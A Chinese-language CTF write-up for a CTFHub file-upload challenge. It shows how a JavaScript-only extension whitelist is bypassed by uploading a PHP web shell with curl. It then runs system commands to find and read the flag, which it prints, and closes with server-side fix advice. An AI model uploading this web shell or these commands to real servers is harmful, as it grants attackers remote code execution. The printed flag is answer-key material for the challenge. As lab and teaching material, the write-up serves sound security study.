CTFHub - Web - 文件上传 - JS 前端验证

# CTFHub # Web # 文件上传 # 前端验证 # RCE

一、题目信息

  • 题目名称：文件上传 - JS 前端验证
  • 题目方向：Web - 文件上传
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：绕过浏览器端扩展名白名单，上传可执行 PHP 文件并读取 Flag。

二、漏洞分析

上传表单通过 onsubmit="return checkfilesuffix()" 在提交前执行 JavaScript 校验。函数仅按文件名后缀判断是否位于 .jpg、.png、.gif 白名单中：

var whitelist = new Array(".jpg", ".png", ".gif");
var file_suffix = file.substring(file.lastIndexOf("."));
if (whitelist.indexOf(file_suffix) == -1) {
    alert("该文件不允许上传");
    return false;
}

该逻辑完全运行在浏览器中。攻击者可以删除或修改前端校验，也可以直接构造 HTTP 请求，绕过表单和 JavaScript 检查。服务端没有对扩展名、MIME 类型或文件内容进行二次校验，并且上传文件保留了原始扩展名，因此最终形成任意 PHP 代码执行。

三、解题步骤

  1. 查看前端校验：查看首页源码，定位 checkfilesuffix()，确认白名单只允许 .jpg、.png、.gif。由于校验仅存在于前端，不能视为安全控制。
  2. 构造 PHP Payload：创建 shell.php，通过 cmd 参数执行系统命令。 
    <?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
  3. 直接上传 PHP 文件：不经过浏览器表单，使用 curl 直接提交 multipart 请求，将文件名设置为 shell.php。 
    curl -F "file=@shell.php;filename=shell.php;type=application/octet-stream" \
     -F "submit=Submit" \
     http://<challenge-host>:10800/
    上传成功后，响应返回可访问的相对路径： 
    <script>alert('上传成功')</script>上传文件相对路径<br>upload/shell.php
  4. 验证代码执行：访问上传后的 PHP 文件并传入系统命令。 
    curl --get \
  --data-urlencode "cmd=id; pwd; ls -la /" \
  "http://<challenge-host>:10800/upload/shell.php"
    响应确认当前用户为 www-data，命令执行目录为 /var/www/html/upload。
  5. 定位 Flag 文件：搜索文件名中包含 flag 的文件。 
    find / -maxdepth 4 -iname "*flag*" 2>/dev/null | head -100
    在结果中发现： 
    /var/www/html/flag_2827410910.php
  6. 读取 Flag：由于 Flag 文件内容是 PHP 注释，直接访问页面不会显示 Flag，需要读取源码。 
    cat /var/www/html/flag_2827410910.php
    <?php // ctfhub{91e0d8cd100de549337cab66}

四、最终 Flag

ctfhub{91e0d8cd100de549337cab66}

五、修复建议

  • 服务端白名单：不要依赖前端 JavaScript 校验，必须在服务端按扩展名实施严格白名单。
  • 校验文件内容：结合真实 MIME 类型和文件头检查，不能只信任请求中的 Content-Type。
  • 重命名存储：由服务端生成随机文件名，避免保留用户可控的扩展名。
  • 隔离上传目录：将上传文件存放在 Web 根目录之外，或关闭上传目录的脚本执行权限。
  • 最小权限：Web 服务进程应使用低权限账户，并限制对源码目录和系统命令的访问。
